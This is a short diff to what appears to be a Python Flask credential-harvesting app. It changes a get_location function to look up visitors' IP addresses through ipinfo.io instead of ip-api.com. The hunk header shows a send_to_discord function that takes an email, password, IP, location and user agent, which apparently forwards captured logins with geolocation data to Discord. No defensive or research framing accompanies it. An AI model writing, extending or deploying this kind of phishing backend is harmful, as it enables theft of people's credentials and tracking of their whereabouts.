@@ -22,17 +22,17 @@ def send_to_discord(email, password, ip, location_str, user_agent):
 
 
 def get_location(ip):
-    url = f"http://ip-api.com/json/{ip}"
-    response = requests.get(url)
+    response = requests.get(f"https://ipinfo.io/{ip}/json")
     if response.status_code == 200:
         data = response.json()
         return {
             "city": data.get("city"),
-            "region": data.get("regionName"),
+            "region": data.get("region"),
             "country": data.get("country"),
             "timezone": data.get("timezone"),
-            "isp": data.get("isp")
+            "isp": data.get("org")
         }
+
 
 
 app = Flask(__name__)
